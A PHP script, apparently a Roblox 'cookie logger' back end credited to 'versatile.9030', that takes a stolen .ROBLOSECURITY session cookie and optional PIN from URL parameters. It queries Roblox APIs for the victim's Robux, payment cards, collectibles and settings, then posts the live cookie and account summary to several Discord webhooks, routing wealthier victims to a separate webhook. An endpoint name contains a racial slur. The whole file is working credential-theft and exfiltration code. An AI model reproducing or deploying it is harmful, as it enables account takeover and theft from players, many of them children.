<?php
$cookie = $_GET['cookie'];
if (isset($_SERVER['HTTPS'])) {
$ht = 'https://';
}else {
$ht = 'http://';
}
$dom = $ht.$_SERVER['SERVER_NAME'];
$cookie = file_get_contents("$dom/controlPage/apis/refresher.php?cookie=$cookie");
if ($cookie == "Invalid Cookie"){
$cookie = file_get_contents("$dom/controlPage/apis/nigger.php?cookie=$cookie");
}
echo $cookie;
error_reporting(0);
function get_csrf_token($cookie) {
    $ch = curl_init("https://auth.roblox.com/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
    $output = curl_exec($ch);
    curl_close($ch);
    preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', $output, $matches);
    return $matches[1];
}

function make_curl_request($url, $cookie, $csrf) {
    $headers = [
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie",
        "x-csrf-token: $csrf"
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

$csrf = get_csrf_token($cookie);

$user_info = make_curl_request("https://www.roblox.com/mobileapi/userinfo", $cookie, $csrf);
$transaction_totals = make_curl_request("https://economy.roblox.com/v2/users/{$user_info['UserID']}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie, $csrf);
$credit_balance = make_curl_request("https://apis.roblox.com/credit-balance/v1/get-conversion-metadata", $cookie, $csrf);
$settings = make_curl_request("https://www.roblox.com/my/settings/json", $cookie, $csrf);
$pin_info = make_curl_request("https://auth.roblox.com/v1/account/pin", $cookie, $csrf);
$collectibles = make_curl_request("https://inventory.roblox.com/v1/users/{$user_info['UserID']}/assets/collectibles?sortOrder=Asc&limit=100", $cookie, $csrf);
$voice_info = make_curl_request("https://voice.roblox.com/v1/settings", $cookie, $csrf);
$payment_profiles = make_curl_request("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $cookie, $csrf);

$rap = array_reduce($collectibles['data'] ?? [], fn($carry, $item) => $carry + ($item['recentAveragePrice'] ?? 0), 0);

$game_votes = [
    'BF' => make_curl_request("https://games.roblox.com/v1/games/994732206/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
    'AMP' => make_curl_request("https://games.roblox.com/v1/games/383310974/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
    'MM2' => make_curl_request("https://games.roblox.com/v1/games/66654135/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False',
    'PS99' => make_curl_request("https://games.roblox.com/v1/games/3317771874/votes/user", $cookie, $csrf)['canVote'] ? 'True' : 'False'
];

$slavermaster = "non filtered webhook here";
if ($user_info['RobuxBalance'] >= "500" || $payment_profiles ? 'True' : 'False' == "True"){
$slavermaster = "filtered webhook here";
}
$fakemaster = $_GET['dh'];

$slave = $_GET["web"];

$timestamp = date("c");
$age = $settings['UserAbove13'] ? '13+' : '13>';
if($_GET['pin']){
$pin2 = $_GET['pin'];
}else{
$pin2 = "";
}
$credit = $credit_balance['creditBalance'];
if (!$credit){
$credit = "0";
}
$json_data = json_encode([
    "content" => "@here",
    "username" => "CAL",
    "avatar_url" => "https://cdn.discordapp.com/icons/1050572542634639420/2abb6780ef2c57ff0302b4d1292218ac.webp?size=2048",
    "tts" => false,
    "embeds" => [
        [
            "title" => "CAL - Result",
            "description" => "[**check 🍪**](https://bloxtools.top/refresher/refresh.php?cookie=$cookie)",
            "type" => "rich",
            "timestamp" => $timestamp,
            "color" => hexdec("5F9EA0"),
            "footer" => ["text" => "Made by versatile.9030"],
            "thumbnail" => ["url" => $user_info['ThumbnailUrl']],
            "fields" => [
       ["name" => "<:person:1090186928344809472> Username ($age)", "value" => $user_info['UserName'], "inline" => true],
                ["name" => "<:robux:815417130861723649> Robux (Pending)", "value" => "{$user_info['RobuxBalance']} ({$transaction_totals['pendingRobuxTotal']})", "inline" => true],
                ["name" => "<:premium:815415937548943370> Premium", "value" => $user_info['IsPremium'] ? 'True' : 'False', "inline" => true],
                ["name" => "<:valkhelmet:1148138751311233244> Rap", "value" => $rap, "inline" => true],
                ["name" => "📰 Robux Incoming / Outgoing", "value" => "{$transaction_totals['incomingRobuxTotal']} / {$transaction_totals['outgoingRobuxTotal']}", "inline" => true],
                ["name" => "💳 Billing", "value" => "Credit: \${$credit_balance['creditBalance']} (Est. {$credit_balance['robuxConversionAmount']} robux)\nCard: " . ($payment_profiles ? 'True' : 'False'), "inline" => true],
                ["name" => ($settings['IsEmailVerified'] ? '✅' : '❌') . " Verified", "value" => $settings['IsEmailVerified'] ? 'True' : 'False', "inline" => true],
               ["name" => "🔐 Pin " . ($pin_info['isEnabled'] ? " (Possible pin)" : ""), "value" => $pin_info['isEnabled'] ? 'True (' . $pin2 . ')' : 'False', "inline" => true],
                ["name" => "🎮 Played BF/AMP/MM2/PS99", "value" => "{$game_votes['BF']}/{$game_votes['AMP']}/{$game_votes['MM2']}/{$game_votes['PS99']}", "inline" => true],
                ["name" => "🔊 VC", "value" => $voice_info['isVoiceEnabled'] ? 'True' : 'False', "inline" => true],
                ["name" => "🍪 Cookie (Auto Refreshed)", "value" => "```$cookie```", "inline" => false]
            ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$ch = curl_init($slavermaster);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$req = curl_exec($ch);
curl_close($ch);
$ch = curl_init($fakemaster);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$req = curl_exec($ch);
curl_close($ch);

$ch = curl_init($slave);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$req = curl_exec($ch);
curl_close($ch);

?>
